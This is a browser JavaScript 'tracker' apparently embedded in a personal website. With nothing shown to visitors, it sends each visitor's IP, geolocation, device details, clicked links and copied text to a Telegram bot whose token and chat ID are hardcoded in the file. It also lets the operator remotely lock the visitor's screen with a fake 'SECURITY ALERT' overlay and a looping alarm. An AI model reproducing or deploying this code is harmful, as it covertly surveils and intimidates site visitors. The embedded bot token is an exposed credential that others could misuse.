// TAURUS TRACKER v2.3 (SESSION CONTINUITY & CLEAN REPORT)
(function () {
    if (window.TAURUS_RUNNING) return;
    window.TAURUS_RUNNING = true;
    console.log("🚀 Taurus Tracker v2.3 (Continuity Mode)");

    // --- CONFIGURATION ---
    const CONFIG = {
        botToken: '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE',
        chatId: '6886010817',
        ipApi: 'https://ipapi.co/json/'
    };

    // --- STATE MANAGEMENT ---
    let sessionID = localStorage.getItem('taurus_sid') || 'sess_' + Math.random().toString(36).substring(2, 9);
    localStorage.setItem('taurus_sid', sessionID);

    // Restore logs from previous page if internal navigation
    let sessionLog = JSON.parse(localStorage.getItem('taurus_logs') || "[]");
    let isInternalNav = false;
    let alarmAudio = new Audio("https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3");
    let audioUnlocked = false;

    // --- AUDIO UNLOCKER ---
    document.addEventListener('click', () => {
        if (!audioUnlocked) {
            alarmAudio.volume = 0;
            alarmAudio.play().then(() => {
                alarmAudio.pause();
                alarmAudio.currentTime = 0;
                alarmAudio.volume = 1;
                audioUnlocked = true;
                console.log("🔊 Audio Unlocked");
            }).catch(e => { });
        }
    }, { once: true, capture: true });

    // --- TELEGRAM SENDER ---
    function sendTelegram(text, buttons = null) {
        const payload = {
            chat_id: CONFIG.chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true, // Clean Report (No Images)
            reply_markup: buttons ? { inline_keyboard: buttons } : undefined
        };
        fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(err => console.error("Telegram Fail:", err));
    }

    // --- DEVICE DETECTION ---
    function getSimpleDevice() {
        const ua = navigator.userAgent;
        let type = "Desktop";
        if (ua.includes("Mac") && navigator.maxTouchPoints > 0) type = "Tablet (iPad)";
        else if (/Mobi|Android/i.test(ua)) type = "Mobile";
        return { type, platform: navigator.platform, ua };
    }

    // --- INITIALIZATION ---
    // If coming from internal nav, DON'T send "Target Acquired" again.
    const wasInternal = sessionStorage.getItem('taurus_internal_flag');
    sessionStorage.removeItem('taurus_internal_flag'); // clear flag

    if (wasInternal) {
        console.log("🔄 Internal Navigation Detected. Resuming Session.");
        initDatabaseSync(); // Just reconnect DB
    } else {
        // NEW SESSION START
        sessionLog = []; // Clear old logs
        localStorage.setItem('taurus_logs', "[]");

        Promise.race([
            fetch(CONFIG.ipApi).then(res => res.json()),
            new Promise(r => setTimeout(() => r({}), 3500))
        ]).then(ipData => {
            const ip = ipData.ip || "IP Timeout";
            const loc = ipData.city ? `${ipData.city}, ${ipData.country_code}` : "Unknown";

            sendTelegram(
                `🎯 <b>TARGET ACQUIRED</b>\n` +
                `🆔 <code>${sessionID}</code>\n` +
                `💻 ${getSimpleDevice().type}\n` +
                `🌍 ${loc} | 📡 ${ip}`,
                [
                    [{ text: "🔔 Alarm", callback_data: `alarm_${sessionID}` },
                    { text: "🚫 Block", callback_data: `block_${sessionID}` }],
                    [{ text: "✅ Unblock", callback_data: `unblock_${sessionID}` }]
                ]
            );

            initDatabaseSync(ip, ipData);
        });
    }

    // --- DATABASE SYNC ---
    function initDatabaseSync(ip = null, ipData = null) {
        // Optimistic Check (Instant)
        if (window.firebase && window.db) {
            connectFirestore(ip, ipData);
            return;
        }
        // Poll Loop (Fast)
        const checkDB = setInterval(() => {
            if (window.firebase && window.db) {
                clearInterval(checkDB);
                connectFirestore(ip, ipData);
            }
        }, 50); // Measured in ms
    }

    function connectFirestore(ip, ipData) {
        const docRef = db.collection('visitors_v1').doc(sessionID);
        // Only update static data if we have it (fresh entry)
        if (ip) {
            docRef.set({
                ip: ip,
                location: ipData || {},
                device: getSimpleDevice(),
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                status: 'online',
                action: 'none'
            }, { merge: true });
        } else {
            docRef.update({ status: 'active', last_seen: firebase.firestore.FieldValue.serverTimestamp() }).catch(() => { });
        }

        // --- COMMAND LISTENER ---
        docRef.onSnapshot((doc) => {
            if (!doc.exists) return;
            const data = doc.data();
            if (data.action && data.action !== 'none') executeCommand(data.action);
        });
    }

    // --- COMMAND EXECUTION ---
    let blockOverlay = null;

    function executeCommand(action) {
        console.log("⚡ EXEC CMD:", action);

        // Visual Confirmation (Toast) to debug
        showToast(`Command: ${action.toUpperCase()}`);

        if (action === 'alarm') {
            alarmAudio.loop = true;
            alarmAudio.play().catch(() => showToast("Audio Blocked - Tap Screen"));
            showBlockScreen("🚨 SECURITY ALERT 🚨", "System Locked by Admin");
        }
        else if (action === 'block') {
            showBlockScreen("🚫 ACCESS DENIED", "You have been blocked.");
        }
        else if (action === 'unblock') {
            stopAlarm();
        }
    }

    function stopAlarm() {
        if (alarmAudio) { alarmAudio.pause(); alarmAudio.currentTime = 0; }
        if (blockOverlay) blockOverlay.style.display = 'none';
        showToast("System Unlocked");
    }

    function showBlockScreen(title, msg) {
        if (!blockOverlay) {
            blockOverlay = document.createElement('div');
            blockOverlay.style.cssText = "position:fixed;inset:0;background:black;color:red;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;font-family:monospace;font-size:24px;";
            blockOverlay.innerHTML = `<h1 style="font-size:50px">🛑</h1><h2 id="blk-t"></h2><p id="blk-m"></p>`;
            document.body.appendChild(blockOverlay);
        }
        document.getElementById('blk-t').innerText = title;
        document.getElementById('blk-m').innerText = msg;
        blockOverlay.style.display = 'flex';
    }

    function showToast(msg) {
        const toast = document.createElement('div');
        toast.innerText = msg;
        toast.style.cssText = "position:fixed;top:20px;right:20px;background:gold;color:black;padding:10px;border-radius:5px;z-index:100000;font-weight:bold;font-family:sans-serif;";
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // --- LOGGING & NAVIGATION LOGIC ---
    function logAndBuffer(action) {
        const entry = `[${new Date().toLocaleTimeString()}] ${action}`;
        sessionLog.push(entry);
        localStorage.setItem('taurus_logs', JSON.stringify(sessionLog));
    }

    // Internal Link Detection
    document.addEventListener('click', (e) => {
        const link = e.target.closest('a');
        if (link) {
            const href = link.getAttribute('href');
            logAndBuffer(`Click: ${link.href}`); // Use full href for log
            // Check internal
            if (href && (href.startsWith('/') || href.startsWith('#') || href.includes('omeryigitler.com') || !href.startsWith('http'))) {
                isInternalNav = true;
                sessionStorage.setItem('taurus_internal_flag', 'true');
            }
        }
    });

    window.addEventListener('copy', () => logAndBuffer(`Copy: "${document.getSelection().toString().substring(0, 50)}..."`));

    // FLUSH ON EXIT (Only if NOT internal nav)
    window.addEventListener('pagehide', () => { // reliable on mobile
        if (!isInternalNav) {
            if (sessionLog.length > 0) {
                const text = `📝 <b>SESSION REPORT (Final)</b>\n` +
                    `🆔 <code>${sessionID}</code>\n` +
                    sessionLog.join('\n');
                sendTelegram(text);
                localStorage.removeItem('taurus_logs'); // Clear logs
                localStorage.setItem('taurus_sid', 'sess_' + Math.random().toString(36).substring(2, 9)); // Reset Session
            }
        }
    });

})();
